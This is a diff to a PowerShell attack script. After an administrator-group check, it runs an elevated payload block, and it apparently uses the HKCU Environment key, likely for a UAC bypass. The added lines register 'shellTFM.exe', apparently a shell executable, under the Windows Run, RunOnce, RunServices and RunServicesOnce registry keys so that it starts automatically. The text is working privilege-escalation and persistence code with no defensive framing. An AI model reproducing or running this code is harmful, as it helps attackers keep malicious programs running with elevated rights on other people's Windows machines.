@@ -2,6 +2,11 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
     #Payload goes here
     #It'll run as Administrator
     mkdir C:\Windows\prueba
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe" 
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe"
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe"
+    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v TFM /t REG_SZ /d "C:\Users\User\Documents\shellTFM.exe"
+    
 
  } else {
     $registryPath = "HKCU:\Environment"
